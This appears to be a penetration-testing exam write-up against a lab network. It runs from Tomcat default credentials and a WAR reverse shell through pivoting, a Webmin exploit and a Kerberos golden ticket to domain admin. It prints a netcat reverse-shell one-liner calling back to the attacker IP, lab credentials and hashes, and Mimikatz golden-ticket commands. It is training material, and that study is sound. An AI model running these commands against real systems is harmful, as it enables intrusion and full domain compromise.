Name: Aldi Satria
IP Target : 172.16.25.0/24
Date: May 2, 2025
Email: aldisatria1996@gmail.com

# 1. Introduction

To establish the connection, we used OpenVPN as the VPN client.
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502191706.png)
After successfully connecting, we verified our IP address using the `ifconfig` command and obtained the IP `172.16.250.29`, which we recorded as the attacker's IP address.
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502200314.png)
# 2. Reconnaisance 
Next, I performed an Nmap scan to identify live hosts within the `172.16.25.0/24` subnet. As previously mentioned, the IP address `172.16.15.1` is out of scope for this exam. The scan revealed only one live host: `172.16.25.2`.
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502191823.png)
We focused our attention on `172.16.25.2` and performed a service and version detection scan using the command `nmap -sC -sV`. The scan revealed several open ports, including web services on ports `80` and `8180`, and notably, port `8080` running **Apache Tomcat version 5.5**, which could be of interest for further exploitation.
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250503072125.png)
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250503072154.png)
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250503072210.png)
# 3. Initial Access
## a. Apache Tomcat
We attempted to access the Apache Tomcat web server by visiting `http://172.16.25.2:8180` and began exploring the web interface. When accessing the **Tomcat Manager**, we encountered basic authentication. I then searched for default Apache Tomcat credentials and found that the credentials `tomcat:tomcat` were valid for this server.
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502194243.png)
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502200105.png)
After logging in, we discovered a file upload feature. We attempted to upload a JSP reverse shell, which we generated using `msfvenom`.
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502200143.png)
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502201531.png)
Upon uploading the file, the server returned an error, indicating that the upload must be in `.war` format. We then recreated the reverse shell as a `.war` file, uploaded it, and successfully gained a shell on the target system.
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502201150.png)
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502203000.png)
## b. Linux Shell
Once we had shell access, we checked the `/etc/passwd` file and found two interesting users: `prod-admin` and `msfadmin`.
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502203550.png)
Next, we accessed `/home/prod-admin` and found a text file containing credentials. Initially, we speculated that these might be SSH credentials.
```
Support User Credential:
User : support
Pass : support@123

Prod-admin Credential: 

User: prod-admin
Pass: Pr0d!@#$%
```

![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502203805.png)
We tried to SSH into 172.16.25.2 using those credentials, but none of them worked.
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502205617.png)
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502210731.png)
We then reconsidered our assumption that the credentials were for SSH and checked for other users in `/etc/passwd`. We tried logging in with the default credentials `msfadmin:msfadmin` (for the `msfadmin` user), and this successfully granted us access.
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502210536.png)
While exploring the shell as `msfadmin`, we ran the `ifconfig` command and discovered another network interface connected to an internal network: `10.10.10.0/24`.
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502211042.png)
We used Nmap with the `-Pn` flag to perform a host discovery scan on the internal network. For each live host identified, we checked for open ports. While `10.10.10.1` had no open ports.
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502212459.png)
nmap result for 10.10.10.2
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502213143.png)
nmap result for 10.10.10.3
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502213446.png)
nmap result for 10.10.10.4
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502213805.png)
nmap result for 10.10.10.5
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502214254.png)
## c. Network Pivoting
As the next step, we initiated **network pivoting** using **proxychains** to facilitate access to the internal network.
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502211841.png)
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502211954.png)
After configuring `proxychains`, we tested connectivity using the `nc` (netcat) command to confirm the setup. The test was successful.
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502212151.png)
## d. 10.10.10.3
When we accessed `http://10.10.10.3:10000`, we found a **webmin login page**, which indicated a potentially valuable target for further exploitation.
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502215940.png)
Using `searchsploit`, we found an exploit titled **“Package Update Escape Bypass RCE”**, and we decided to use Metasploit to exploit it.
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502221723.png)
We configured the necessary variables in Metasploit and used the credentials found earlier in the `prod-admin` directory (`support:support@123`). The exploit was successful, and we obtained a shell on the internal machine.
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502223520.png)
For easier access, we set up an `nc` listener to obtain another reverse shell, and it was successful.
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.16.250.29 5555 >/tmp/f
```
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502224006.png)
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502224046.png)
After further exploration, we discovered that `child-admin.keytab` is part of the Kerberos authentication system. Since we could not SCP the `child-admin.keytab` file, we converted it to Base64 and copied the Base64-encoded data to our local machine.
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502224725.png)
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502230925.png)
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502230944.png)
We used this tool to extract the NTLM hash from the keytab file and successfully obtained the NTLM hash for the `child-admin` user.
https://github.com/sosdave/KeyTabExtract
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502231222.png)
```
dbac2b57a73bb883422658d2aea36967
```

## e. 10.10.10.2
After obtaining the NTLM hash, we used `impacket-psexec` to log into the shell using the hash on 10.10.10.2, as the IP had Kerberos service, and we successfully logged in.
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250502232758.png)
We used tools from PowerSploit ([https://github.com/PowerShellMafia/PowerSploit.git](https://github.com/PowerShellMafia/PowerSploit.git)) to gather information about the Windows server. We set up a mini web server to retrieve tools from our local machine and imported the `PowerView.ps1` module. We then used commands to obtain the Security Identifier (SID) of the domain.
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250503003406.png)
```
Get-DomainSID -Domain child.redteam.corp
S-1-5-21-2332039752-785340267-2377082902

Get-DomainSID -Domain redteam.corp
S-1-5-21-1882140339-3759710628-635303199

```
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250503011259.png)
# 4. Privilege Escalation
To obtain the Kerberos `krbtgt` hash, we executed Mimikatz on the compromised system. Mimikatz was transferred in the same manner as `powerview.ps1` was, using `iwr`.
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250503014200.png)
We ran the command `lsadump::lsa /patch` and successfully obtained the `krbtgt` hash.
```
RID  : 000001f6 (502)
User : krbtgt
LM   : 
NTLM : 24dd6646fd7e11b60b6a9508e6fe7e5a
```
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250503014451.png)
With the SID and `krbtgt` hash, we attempted to generate a golden ticket to escalate our privileges to administrator.
```
kerberos::golden /user:Administrator /domain:child.redteam.corp /sid:S-1-5-21-2332039752-785340267-2377082902 /sids:S-1-5-21-1882140339-3759710628-635303199-519 /krbtgt:24dd6646fd7e11b60b6a9508e6fe7e5a /ptt
```
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250503015733.png)
run this command to know parentDC from the domain and try acces directory
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250503021509.png)
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250503022013.png)
As our goal in the exam was to access `secret.xml`, we explored the Administrator directory and successfully located it.
```
type \\RED-DC.redteam.corp\C$\Users\Administrator\Desktop\secret.xml
```
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250503022043.png)
![](../HTB%20Medium%20-%20TheFrizz/Pasted%20image%2020250503025443.png)
# 5. Conclussion

...


